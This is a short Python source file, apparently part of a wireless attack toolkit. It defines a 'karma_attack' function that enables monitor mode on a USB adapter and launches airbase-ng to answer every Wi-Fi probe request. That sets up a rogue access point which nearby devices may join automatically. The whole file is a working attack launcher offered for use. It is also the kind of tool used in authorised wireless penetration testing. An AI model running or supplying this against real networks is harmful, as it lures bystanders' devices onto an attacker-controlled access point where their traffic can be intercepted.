#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode
from utils.status import print_status
from utils.process import active_processes, add_process, remove_process


def karma_attack() -> bool:
    """Karma attack: respond to probe requests with airbase-ng."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status("Karma attack initiated", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    try:
        proc = subprocess.Popen(["airbase-ng", "-P", "-C", "30", "-v", mon_iface],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(proc)
        print_status("Karma attack active", "success")
        print_status("Press Ctrl+C to stop", "info")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_status("Karma attack stopped", "info")
        remove_process(proc)
    return True
